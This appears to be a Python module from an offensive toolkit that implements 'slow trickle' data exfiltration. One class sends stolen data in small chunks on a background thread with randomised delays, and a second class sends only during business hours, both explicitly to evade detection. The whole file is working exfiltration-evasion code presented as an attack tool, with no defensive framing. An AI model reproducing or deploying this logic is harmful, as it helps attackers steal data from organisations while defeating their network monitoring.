"""
Slow Trickle Exfiltration
Exfiltrate data slowly over extended period to avoid detection
"""

import time
import random
import threading
from typing import Callable, Optional
from datetime import datetime, timedelta

class SlowTrickleExfil:
    """
    Slowly exfiltrates data over time to evade detection
    """
    
    def __init__(self, exfil_function: Callable, 
                 min_delay: int = 60, max_delay: int = 300):
        """
        Args:
            exfil_function: Function that performs actual exfiltration
            min_delay: Minimum delay between chunks (seconds)
            max_delay: Maximum delay between chunks (seconds)
        """
        self.exfil_function = exfil_function
        self.min_delay = min_delay
        self.max_delay = max_delay
        self.active = False
        self.thread = None
    
    def start_trickle(self, data: bytes, chunk_size: int = 1024) -> bool:
        """
        Start slow trickle exfiltration in background
        """
        if self.active:
            print("[!] Trickle exfiltration already active")
            return False
        
        self.active = True
        
        # Split data into chunks
        chunks = [data[i:i+chunk_size] for i in range(0, len(data), chunk_size)]
        
        print(f"[*] Starting slow trickle exfiltration")
        print(f"    Total size: {len(data)} bytes")
        print(f"    Chunks: {len(chunks)}")
        print(f"    Delay range: {self.min_delay}-{self.max_delay}s")
        
        # Start background thread
        self.thread = threading.Thread(
            target=self._trickle_worker,
            args=(chunks,),
            daemon=True
        )
        self.thread.start()
        
        return True
    
    def _trickle_worker(self, chunks: list):
        """Background worker that sends data slowly"""
        start_time = datetime.now()
        
        for i, chunk in enumerate(chunks):
            if not self.active:
                print("[*] Trickle exfiltration stopped")
                break
            
            try:
                # Send chunk
                self.exfil_function(chunk)
                
                print(f"[*] Chunk {i+1}/{len(chunks)} exfiltrated")
                
                # Random delay
                if i < len(chunks) - 1:
                    delay = random.randint(self.min_delay, self.max_delay)
                    
                    # Estimate completion time
                    elapsed = (datetime.now() - start_time).total_seconds()
                    avg_time_per_chunk = elapsed / (i + 1)
                    remaining_chunks = len(chunks) - (i + 1)
                    eta = timedelta(seconds=int(avg_time_per_chunk * remaining_chunks))
                    
                    print(f"[*] Waiting {delay}s... (ETA: {eta})")
                    time.sleep(delay)
            
            except Exception as e:
                print(f"[!] Error exfiltrating chunk {i}: {str(e)}")
        
        self.active = False
        total_time = datetime.now() - start_time
        print(f"[+] Trickle exfiltration complete in {total_time}")
    
    def stop(self):
        """Stop trickle exfiltration"""
        self.active = False
        if self.thread:
            self.thread.join(timeout=5)
    
    def is_active(self) -> bool:
        """Check if trickle is active"""
        return self.active


class TimeBasedTrickle:
    """
    Exfiltrates only during specific time windows
    """
    
    def __init__(self, exfil_function: Callable):
        self.exfil_function = exfil_function
        self.active = False
    
    def exfiltrate_business_hours(self, data: bytes, 
                                  start_hour: int = 9, 
                                  end_hour: int = 17) -> bool:
        """
        Only exfiltrate during business hours
        """
        print(f"[*] Time-based exfiltration: {start_hour}:00-{end_hour}:00")
        
        chunk_size = 1024
        chunks = [data[i:i+chunk_size] for i in range(0, len(data), chunk_size)]
        
        sent_count = 0
        
        for chunk in chunks:
            # Wait until business hours
            while True:
                current_hour = datetime.now().hour
                
                if start_hour <= current_hour < end_hour:
                    # During business hours
                    try:
                        self.exfil_function(chunk)
                        sent_count += 1
                        print(f"[*] Chunk {sent_count}/{len(chunks)} sent at {datetime.now().strftime('%H:%M')}")
                        
                        # Random delay (1-10 minutes)
                        time.sleep(random.randint(60, 600))
                        break
                    except Exception as e:
                        print(f"[!] Error: {str(e)}")
                        break
                else:
                    # Outside business hours - wait
                    print(f"[*] Outside business hours (current: {current_hour}:00), waiting...")
                    time.sleep(1800)  # Check every 30 minutes
        
        print(f"[+] Time-based exfiltration complete: {sent_count}/{len(chunks)} chunks")
        return sent_count == len(chunks)
